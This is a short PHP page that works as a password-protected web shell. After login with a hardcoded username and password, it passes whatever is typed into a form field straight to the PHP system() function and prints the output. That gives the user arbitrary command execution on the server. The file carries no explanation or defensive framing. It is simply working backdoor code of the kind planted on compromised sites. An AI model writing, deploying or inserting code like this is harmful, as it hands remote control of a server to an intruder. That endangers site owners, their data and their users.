<?php
session_start();
//echo $_SERVER['DOCUMENT_ROOT'];
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
<?php
if($_SERVER['REQUEST_METHOD']=="POST")
{
	if($_POST['type']=="lg")
	{
		$u=$_POST['user'];
		$p=$_POST['pass'];
		if($u=="aks060")
		{
			if($p=="aapnapassworddaalo")
			{
				$_SESSION['sp_user']="ok";
			}
			/*else
				unset($_SESSION['sp_user']);*/
		}
		/*else
			unset($_SESSION['sp_user']);*/
	}
	elseif ($_POST['type']=="sp" && $_SESSION['sp_user']=="ok") {
		$c=$_POST['cmd'];
		$op=system($c);
			echo $op;
	}
}
?>
</head>
<body>
<form method="post">
<?php
if(isset($_SESSION['sp_user']) && $_SESSION['sp_user']=="ok")
{
?>
	<input type="text" name="cmd">
<input type="hidden" name="type" value="sp">
<input type="submit" >
<?php
}
else
{
?>
	<input type="text" name="user">
	<input type="password" name="pass">
	<input type="hidden" name="type" value="lg">
	<input type="submit">
<?php
}

?>
</form>
</body>
</html>
